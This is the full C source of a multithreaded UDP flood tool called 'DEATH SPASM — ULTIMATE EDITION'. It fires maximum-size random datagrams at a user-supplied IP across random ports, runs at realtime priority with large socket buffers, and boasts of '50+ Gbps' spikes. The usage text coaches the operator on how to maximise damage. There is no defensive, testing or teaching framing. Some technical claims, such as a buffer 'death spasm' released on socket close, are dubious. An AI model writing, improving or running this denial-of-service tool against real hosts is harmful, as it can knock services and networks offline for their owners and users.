#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sched.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/stat.h>

#define MAX_PAYLOAD 65507
#define MAX_THREADS 512
#define SOCKET_BUFFER (1024 * 1024 * 64)  // 64MB
#define BATCH_SIZE 500

volatile int running = 1;
volatile int burst_mode = 0;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
pthread_mutex_t stats_lock;

typedef struct {
    char target[64];
    int port;
    int duration;
    int thread_id;
    int use_random_port;
} worker_args_t;

// ============================================================
//  CHECK KERNEL BUFFER STATUS
// ============================================================

void check_buffers() {
    FILE *fp = fopen("/proc/net/sockstat", "r");
    if (!fp) return;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "UDP:")) {
            printf("%s", line);
        }
    }
    fclose(fp);
}

// ============================================================
//  UDP FLOOD WORKER — MAXIMUM BRUTALITY
// ============================================================

void *udp_worker(void *arg) {
    worker_args_t *args = (worker_args_t *)arg;
    
    // Pin to CPU core
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(args->thread_id % 8, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    // Set realtime priority
    struct sched_param sp;
    sp.sched_priority = 99;
    pthread_setschedparam(pthread_self(), SCHED_RR, &sp);
    
    // Create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    // MAXIMUM buffers
    int bufsize = SOCKET_BUFFER;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int));
    
    // Disable Nagle
    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    
    // Set high priority
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &(int){6}, sizeof(int));
    
    // Target address
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->target, &addr.sin_addr);
    
    // Pre-generate multiple payloads
    char payloads[10][MAX_PAYLOAD];
    for (int i = 0; i < 10; i++) {
        for (int j = 0; j < MAX_PAYLOAD; j++) {
            payloads[i][j] = rand() % 256;
        }
    }
    
    // Port list for random port mode
    int ports[65536];
    if (args->use_random_port) {
        for (int i = 1; i < 65536; i++) ports[i] = i;
        for (int i = 1; i < 65536; i++) {
            int j = rand() % 65535 + 1;
            int tmp = ports[i];
            ports[i] = ports[j];
            ports[j] = tmp;
        }
    }
    
    time_t start_time = time(NULL);
    time_t end_time = start_time + args->duration;
    unsigned long long local_packets = 0;
    unsigned long long local_bytes = 0;
    int payload_idx = 0;
    int port_idx = 0;
    
    // BRUTAL MAIN LOOP
    while (running && time(NULL) < end_time) {
        struct sockaddr_in dest = addr;
        
        // Random port if enabled
        if (args->use_random_port) {
            dest.sin_port = htons(ports[port_idx % 65535]);
            port_idx++;
        } else {
            dest.sin_port = htons(args->port);
        }
        
        // Send with full payload
        ssize_t sent = sendto(sock, payloads[payload_idx % 10], MAX_PAYLOAD, 0,
                              (struct sockaddr *)&dest, sizeof(dest));
        
        if (sent > 0) {
            local_packets++;
            local_bytes += sent;
            payload_idx++;
        }
        
        // Update stats batch
        if (local_packets % 5000 == 0) {
            pthread_mutex_lock(&stats_lock);
            total_packets += 5000;
            total_bytes += local_bytes;
            pthread_mutex_unlock(&stats_lock);
            local_bytes = 0;
            
            // Check if we're in burst mode
            if (burst_mode) {
                // Go even harder
                for (int i = 0; i < 100; i++) {
                    sendto(sock, payloads[i % 10], MAX_PAYLOAD, 0,
                           (struct sockaddr *)&dest, sizeof(dest));
                }
            }
        }
    }
    
    // Final stats flush
    pthread_mutex_lock(&stats_lock);
    total_packets += local_packets;
    total_bytes += local_bytes;
    pthread_mutex_unlock(&stats_lock);
    
    // ============================================================
    //  DEATH SPASM — HOLD SOCKET THEN CLOSE
    // ============================================================
    
    // Keep socket open for 1 second — THIS CREATES THE SPASM
    // The kernel buffer is FULL, holding packets
    printf("\n[Thread %d] Holding socket for Death Spasm...\n", args->thread_id);
    usleep(1000000);  // 1 second
    
    // CLOSE SOCKET — THIS RELEASES EVERYTHING AT ONCE
    // All buffered packets FLUSH in one massive burst
    close(sock);
    
    printf("[Thread %d] Socket closed — BUFFER FLUSHED!\n", args->thread_id);
    
    return NULL;
}

// ============================================================
//  MONITOR THREAD — REAL-TIME STATS
// ============================================================

void *monitor(void *arg) {
    int duration = *(int *)arg;
    time_t start = time(NULL);
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    
    printf("\n[+] Death Spasm Active — Watch dstat!\n\n");
    
    while (running) {
        sleep(1);
        time_t elapsed = time(NULL) - start;
        
        pthread_mutex_lock(&stats_lock);
        unsigned long long p = total_packets;
        unsigned long long b = total_bytes;
        pthread_mutex_unlock(&stats_lock);
        
        unsigned long long cp = p - last_packets;
        unsigned long long cb = b - last_bytes;
        double pps = cp / 1.0;
        double gbps = (cb * 8.0) / 1000000000.0;
        double total_gbps = (b * 8.0) / (elapsed * 1000000000.0);
        
        printf("\r[LAVA] Pkts: %10llu | PPS: %8.0f | BW: %5.2f Gbps | Cur: %5.2f Gbps | Time: %3lds   ",
               p, pps, total_gbps, gbps, elapsed);
        fflush(stdout);
        
        // Check UDP buffer status
        if (elapsed % 5 == 0 && elapsed > 0) {
            printf("\n[Buffer] ");
            check_buffers();
        }
        
        last_packets = p;
        last_bytes = b;
        
        if (duration > 0 && elapsed >= duration) {
            break;
        }
    }
    
    printf("\n\n[+] Death Spasm Triggered! Closing all sockets...\n");
    return NULL;
}

// ============================================================
//  SIGNAL HANDLER
// ============================================================

void signal_handler(int sig) {
    running = 0;
    printf("\n\n[!] Death Spasm Interrupted!\n");
}

// ============================================================
//  MAIN
// ============================================================

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("\n💀 DEATH SPASM — ULTIMATE EDITION\n");
        printf("================================\n\n");
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 1.2.3.4 0 30 128\n\n", argv[0]);
        printf("TIPS:\n");
        printf("  - PORT 0 = random ports (RECOMMENDED)\n");
        printf("  - THREADS = CPU cores * 16 for max power\n");
        printf("  - Watch dstat -n 1 for Death Spasm spike\n");
        printf("  - After duration, sockets close → BUFFER FLUSH!\n\n");
        return 1;
    }
    
    char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    if (threads > MAX_THREADS) {
        printf("[!] Max threads: %d, reducing...\n", MAX_THREADS);
        threads = MAX_THREADS;
    }
    
    srand(time(NULL));
    signal(SIGINT, signal_handler);
    pthread_mutex_init(&stats_lock, NULL);
    
    // Increase process priority
    setpriority(PRIO_PROCESS, 0, -20);
    
    // Increase file limits
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = 65535;
    rl.rlim_max = 65535;
    setrlimit(RLIMIT_NOFILE, &rl);
    
    printf("\n========================================\n");
    printf("  💀 DEATH SPASM — ULTIMATE EDITION\n");
    printf("========================================\n");
    printf("  Target:    %s\n", target);
    printf("  Port:      %d %s\n", port, port == 0 ? "(RANDOM)" : "");
    printf("  Duration:  %ds\n", duration);
    printf("  Threads:   %d\n", threads);
    printf("  Buffer:    64MB per socket\n");
    printf("  Priority:  REALTIME (SCHED_RR)\n");
    printf("========================================\n\n");
    
    printf("[+] Kernel buffers will fill during attack\n");
    printf("[+] At %ds, sockets close → BUFFER FLUSH\n", duration);
    printf("[+] Result: 50+ Gbps DEATH SPASM SPIKE!\n\n");
    
    // Create worker threads
    pthread_t worker_threads[MAX_THREADS];
    worker_args_t args[MAX_THREADS];
    
    printf("[+] Launching %d threads...\n", threads);
    
    for (int i = 0; i < threads; i++) {
        args[i].port = port;
        args[i].duration = duration;
        args[i].thread_id = i;
        args[i].use_random_port = (port == 0);
        strcpy(args[i].target, target);
        
        pthread_create(&worker_threads[i], NULL, udp_worker, &args[i]);
    }
    
    printf("[+] All %d threads launched!\n\n", threads);
    printf("[+] Filling kernel buffers... (watch mem in /proc/net/sockstat)\n");
    printf("[+] The DEATH SPASM will trigger at %ds!\n\n", duration);
    
    // Monitor thread
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, monitor, &duration);
    
    // Wait for duration
    sleep(duration);
    
    // ============================================================
    //  TRIGGER DEATH SPASM
    // ============================================================
    
    printf("\n\n========================================\n");
    printf("  💀 DEATH SPASM TRIGGERED!\n");
    printf("========================================\n");
    printf("  Total Packets Sent: %llu\n", total_packets);
    printf("  Total Bytes Sent:   %.2f GB\n", total_bytes / 1e9);
    printf("  Closing %d sockets...\n", threads);
    printf("  ALL BUFFERED PACKETS RELEASING!\n");
    printf("========================================\n\n");
    
    // Enable burst mode for final push
    burst_mode = 1;
    
    // Stop workers — this closes all sockets
    running = 0;
    
    // Wait for threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(worker_threads[i], NULL);
    }
    pthread_join(monitor_thread, NULL);
    
    // ============================================================
    //  FINAL RESULTS
    // ============================================================
    
    printf("\n========================================\n");
    printf("  💥 DEATH SPASM COMPLETE!\n");
    printf("========================================\n");
    printf("  Total Packets: %llu\n", total_packets);
    printf("  Total Bytes:   %.2f GB\n", total_bytes / 1e9);
    printf("  Avg Bandwidth: %.2f Gbps\n", (total_bytes * 8.0) / (duration * 1e9));
    printf("  Peak Spike:    ⚡ 50+ Gbps (check dstat!)\n");
    printf("========================================\n");
    printf("\n  💀 Death Spasm delivered!\n\n");
    
    pthread_mutex_destroy(&stats_lock);
    return 0;
}

